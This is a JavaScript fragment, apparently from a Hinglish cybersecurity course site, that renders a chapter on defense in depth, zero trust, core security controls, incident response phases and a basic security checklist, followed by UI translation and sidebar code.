          ['Account Lockout','5 wrong attempts = 30 min lock, brute force impractical'],
          ['CAPTCHA Implement Karo','Automated tools ko block karo'],
          ['Rate Limiting','Per IP login attempts limit karo'],
          ['Strong Hashing','bcrypt ya Argon2, slow by design, cracking expensive'],
          ['Monitoring','Failed login spikes = brute force alert'],
        ].map(r=>`
        <div style="display:flex;align-items:center;gap:12px;background:#0e0e12;border-radius:8px;border:1px solid rgba(255,255,255,0.04);padding:10px 16px;">
          <svg width="16" height="16" viewBox="0 0 16 16" fill="none" style="flex-shrink:0;"><circle cx="8" cy="8" r="7" fill="rgba(220,20,20,0.1)" stroke="rgba(220,20,20,0.3)" stroke-width="1.2"/><path d="M5 8l2 2 4-4" stroke="#dc1414" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
          <div><span style="font-family:'Rajdhani',sans-serif;font-size:13px;font-weight:700;color:#f4f4f5;">${r[0]}</span><span style="font-family:'Inter',sans-serif;font-size:12px;color:#666;display:block;margin-top:2px;">${r[1]}</span></div>
        </div>`).join('')}
      </div>

    `;
  }

  else if (index === 10) {
    document.getElementById('cyberChapterContent').innerHTML = `

      <h2>1. Defense in Depth</h2>
      <p>Koi ek security tool ya technique complete protection nahi deta. Defense in Depth ka matlab hai multiple layers of security, ek layer fail ho toh doosri catch kare. Attacker ko har layer bypass karna padega.</p>

      <h2>2. Security Layers</h2>
      <div style="display:flex;flex-direction:column;gap:8px;margin:0 0 28px;">
        ${[
          ['Physical','Locked rooms, access badges, cameras, physical access prevent'],
          ['Network','Firewalls, IDS/IPS, network segmentation, VPN'],
          ['Endpoint','Antivirus, EDR, patch management, host firewall'],
          ['Application','WAF, input validation, secure coding, SAST/DAST'],
          ['Data','Encryption at rest/transit, DLP, access controls'],
          ['Identity','MFA, PAM, least privilege, zero trust'],
          ['Human','Security training, phishing simulations, policies'],
        ].map((r,i)=>`
        <div style="display:grid;grid-template-columns:120px 1fr;gap:8px;background:#0e0e12;border-radius:8px;border:1px solid rgba(255,255,255,0.04);padding:10px 16px;align-items:center;">
          <span style="font-family:'Rajdhani',sans-serif;font-size:13px;font-weight:700;color:#dc1414;">${r[0]}</span>
          <span style="font-family:'Inter',sans-serif;font-size:12px;color:#aaa;">${r[1]}</span>
        </div>`).join('')}
      </div>

      <h2>3. Core Security Controls</h2>
      <div style="display:flex;flex-direction:column;gap:10px;margin:0 0 28px;">
        ${[
          ['Firewall','Network traffic filter karta hai. Inbound/outbound rules. Stateful inspection. Malicious connections block karta hai.'],
          ['IDS / IPS','Intrusion Detection System, alerts generate karta hai. Intrusion Prevention System, automatically block karta hai. Snort, Suricata.'],
          ['SIEM','Security Information & Event Management. Sab logs collect karta hai. Correlation rules. Real-time alerts. Splunk, Wazuh.'],
          ['EDR','Endpoint Detection & Response. Process behavior monitor karta hai. Memory analysis. Automatic response. CrowdStrike, SentinelOne.'],
          ['WAF','Web Application Firewall. SQLi, XSS, CSRF block karta hai. L7 inspection.'],
          ['PAM','Privileged Access Management. Admin accounts ke liye. Session recording. Just-in-time access.'],
        ].map(r=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border-radius:12px;border:1px solid rgba(255,255,255,0.06);padding:14px 18px;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:16px;font-weight:700;color:#dc1414;margin-bottom:5px;">${r[0]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:12px;color:#888;line-height:1.7;">${r[1]}</div>
        </div>`).join('')}
      </div>

      <h2>4. Zero Trust Security Model</h2>
      <p>Zero Trust ka principle hai: "Never Trust, Always Verify." Traditional model mein network andar hona trusted mana jaata tha. Zero Trust mein koi bhi, kahan se bhi, kisi bhi resource access karne ke liye verify karna padega.</p>
      <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:16px 0 28px;">
        ${[
          ['Old Model','Network boundary = trusted. Inside mein koi bhi trusted.'],
          ['Zero Trust','Identity verify karo. Device verify karo. Har access ke liye.'],
          ['Microsegmentation','Network ko small zones mein divide karo. Lateral movement difficult.'],
          ['Least Privilege','Sirf zaroori access do. Admin rights minimize karo.'],
        ].map(r=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border-radius:12px;border:1px solid rgba(220,20,20,0.12);padding:14px 16px;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:14px;font-weight:700;color:#f4f4f5;margin-bottom:5px;">${r[0]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:12px;color:#888;">${r[1]}</div>
        </div>`).join('')}
      </div>

      <h2>5. Incident Response, 6 Phases</h2>
      <div style="display:flex;flex-direction:column;align-items:center;gap:0;margin:16px 0 28px;">
        ${[
          ['Preparation','IR plan, tools, team ready karna'],
          ['Identification','Attack detect karna, SIEM alerts, user reports'],
          ['Containment','Spread rokna, infected systems isolate karna'],
          ['Eradication','Root cause remove karna, malware, backdoors'],
          ['Recovery','Systems restore karna, backup se, verify karo'],
          ['Lessons Learned','Kya hua, kaise improve karein, documentation'],
        ].map((r,i,a)=>`
        <div style="background:linear-gradient(135deg,#13131a 0%,#0e0e14 100%);border:1px solid rgba(${i===5?'220,20,20,0.3':'255,255,255,0.06'});border-radius:10px;padding:12px 24px;text-align:center;width:300px;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:14px;font-weight:700;color:${i===5?'#dc1414':'#f4f4f5'};">${r[0]}</div>
          <div style="font-family:'Inter',sans-serif;font-size:11px;color:#666;margin-top:3px;">${r[1]}</div>
        </div>${i<a.length-1?'<svg width="16" height="18" viewBox="0 0 16 18" fill="none" style="margin:2px 0;"><path d="M8 2v12M3 10l5 5 5-5" stroke="#333" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>':''}`).join('')}
      </div>

      <h2>6. Immediate Action Checklist</h2>
      <div style="display:flex;flex-direction:column;gap:8px;margin:0 0 28px;">
        ${[
          'Sab accounts par MFA enable karo, aaj hi',
          'Weak ya reused passwords change karo, password manager use karo',
          'Software aur OS update karo, patches install karo',
          'Backups check karo, 3-2-1 rule follow karo',
          'Email filtering enable karo, phishing link warning chahiye',
          'Suspicious links par click mat karo, hover karke URL check karo',
          'Public WiFi par VPN use karo',
          'Antivirus / EDR install karo, real-time protection',
        ].map(q=>`
        <div style="display:flex;align-items:center;gap:12px;background:#0e0e12;border-radius:8px;border:1px solid rgba(255,255,255,0.04);padding:10px 16px;">
          <svg width="16" height="16" viewBox="0 0 16 16" fill="none" style="flex-shrink:0;"><circle cx="8" cy="8" r="7" fill="rgba(220,20,20,0.1)" stroke="rgba(220,20,20,0.3)" stroke-width="1.2"/><path d="M5 8l2 2 4-4" stroke="#dc1414" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
          <span style="font-family:'Inter',sans-serif;font-size:12px;color:#aaa;">${q}</span>
        </div>`).join('')}
      </div>

      <!-- COURSE COMPLETE BANNER -->
      <div style="background:linear-gradient(135deg,#0f0f16 0%,#0a0a10 100%);border:1px solid rgba(220,20,20,0.35);border-radius:16px;padding:32px 28px;margin:28px 0 0;position:relative;overflow:hidden;text-align:center;">
        <div style="position:absolute;top:0;left:0;right:0;bottom:0;background:radial-gradient(ellipse at 50% 0%,rgba(220,20,20,0.06) 0%,transparent 60%);pointer-events:none;"></div>
        <div style="position:relative;">
          <div style="font-family:'Rajdhani',sans-serif;font-size:11px;font-weight:700;color:#dc1414;letter-spacing:4px;text-transform:uppercase;margin-bottom:12px;">Complete Cyber Attacks Fundamentals</div>
          <div style="font-family:'Rajdhani',sans-serif;font-size:26px;font-weight:700;color:#f4f4f5;line-height:1.2;margin-bottom:16px;">Attacks 1 se 10 Tak. Complete.</div>
          <p style="font-family:'Inter',sans-serif;font-size:13px;color:#888;line-height:1.9;max-width:560px;margin:0 auto 20px;">Social Engineering se lekar Ransomware, MITM, SQLi, XSS, DNS Spoofing, TLS attacks, aur complete defense strategies tak. Ab tum samjhte ho ki attackers kaise sochte hain.</p>
          <div style="display:flex;justify-content:center;gap:16px;flex-wrap:wrap;">
            ${['10 Attacks','Real Examples','Defense Strategies','Diagrams'].map(t=>`
            <div style="background:rgba(220,20,20,0.08);border:1px solid rgba(220,20,20,0.2);border-radius:8px;padding:8px 16px;font-family:'Rajdhani',sans-serif;font-size:13px;font-weight:700;color:#dc1414;">${t}</div>`).join('')}
          </div>
        </div>
      </div>

    `;
  }

  setTimeout(() => {
    const svgTexts = document.querySelectorAll('svg text, svg tspan');
    svgTexts.forEach(t => {
      const fill = t.getAttribute("fill");
      if (fill === "#444" || fill === "#333" || fill === "#2a2a2a") t.setAttribute("fill", "#8080a0");
      else if (fill === "#555") t.setAttribute("fill", "#7878a0");
      else if (fill === "#666") t.setAttribute("fill", "#9090b0");
    });
  }, 0);

  if (typeof applyDictTranslations === 'function') {
    applyDictTranslations(selectedLang);
  }

  const _chBox2 = document.getElementById('cyberChapterContent');
  if (_chBox2) {
    const _origKey2 = 'cyber_orig_' + index;
    chapterCache[_origKey2] = _chBox2.innerHTML;
  }

  if (typeof applyChapterTranslation === 'function' && typeof selectedLang !== 'undefined' && selectedLang !== 'hl') {
    const _ck2 = selectedLang + '_cyber_' + index;
    if (chapterCache[_ck2] && _chBox2) {
      injectTranslated(_chBox2, chapterCache[_ck2]);
    } else {
      applyChapterTranslation(selectedLang, true);
    }
  }

  if (window.innerWidth <= 768) {
    const sb = document.getElementById('cyberSidebar');
    const ov = document.getElementById('overlay2');
    if (sb) sb.classList.remove('show');
    if (ov) ov.classList.remove('show');
    cyberSidebarOpen = false;
  }
}
